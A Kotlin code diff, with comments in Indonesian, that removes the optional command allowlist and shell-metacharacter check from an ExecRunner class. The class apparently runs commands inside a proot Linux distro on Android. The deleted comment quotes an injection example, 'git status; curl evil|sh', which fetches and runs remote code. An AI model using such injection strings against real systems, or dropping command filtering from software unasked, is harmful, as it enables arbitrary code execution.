@@ -21,8 +21,8 @@ import java.util.concurrent.TimeUnit
  * runtime belum siap, [run] melempar error yang menjelaskan langkah
  * perbaikannya — bukan diam-diam menjalankan command di shell Android.
  *
- * Garantean keamanan tetap: allowlist opsional, timeout, cap output 200 KB, dan
- * approval gate dari UI (5 tool sensitif).
+ * Perlindungan tetap: timeout per command, cap output 200 KB, dan approval gate
+ * dari UI (5 tool sensitif).
  */
 data class ExecResult(
     val stdout: String = "",
@@ -42,24 +42,6 @@ class ExecRunner(
         /** Timeout default satu command di distro (apk add bisa lama). */
         const val PROOT_DEFAULT_TIMEOUT_MS = 60_000L
         const val MAX_OUT = 200_000
-    }
-
-    private var allowlist: List<String> = emptyList()
-
-    fun setAllowlist(prefixes: List<String>) {
-        allowlist = prefixes.map { it.trim() }.filter { it.isNotEmpty() }
-    }
-
-    private fun isAllowed(command: String): Boolean {
-        if (allowlist.isEmpty()) return true
-        val trimmed = command.trim()
-        // Tolak metachar shell pada token pertama (mencegah "git status; curl evil|sh").
-        val firstToken = trimmed.split(Regex("\\s+")).firstOrNull() ?: return false
-        if (firstToken.any { it == ';' || it == '|' || it == '&' || it == '$' || it == '`' || it == '(' || it == ')' || it == '<' || it == '>' || it == '\\' }) return false
-        // Prefix match hanya pada batas token ("git" tidak meloloskan "github-cli").
-        return allowlist.any { entry ->
-            trimmed.startsWith(entry) && (trimmed.length == entry.length || trimmed[entry.length].isWhitespace())
-        }
     }
 
     /** Alasan runtime belum siap (cek ringan, tanpa menghitung ukuran rootfs); null = siap. */
@@ -84,7 +66,6 @@ class ExecRunner(
         onProcess: ((Process) -> Unit)? = null,
     ): ExecResult {
         if (command.isBlank()) throw IllegalStateException("command required")
-        if (!isAllowed(command)) throw IllegalStateException("command not in allowlist")
 
         notReadyReason()?.let { reason ->
             throw IllegalStateException("Runtime belum siap: $reason.")
